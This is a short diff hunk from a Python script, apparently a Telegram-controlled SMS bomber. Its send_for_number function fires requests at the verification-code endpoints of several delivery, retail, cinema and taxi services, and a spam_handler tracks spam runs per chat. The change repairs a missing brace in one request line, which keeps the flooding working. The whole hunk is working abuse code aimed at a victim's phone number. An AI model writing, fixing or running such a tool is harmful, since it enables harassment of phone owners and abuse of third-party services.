@@ -144,7 +144,7 @@ def send_for_number(phone):
         requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number": "+" + phone})
         requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={"phone": "+" + phone})
         requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},json={"Phone": phone, "Type": 1})
-        requests.post('https://guru.taxi/api/v1/driver/session/verify', json={"phone": {"code": 1, "number": phone})
+        requests.post('https://guru.taxi/api/v1/driver/session/verify', json={"phone": {"code": 1, "number": phone}})
 
 def spam_handler(phone, chat_id, force):
     if int(chat_id) in running_spams_per_chat_id:
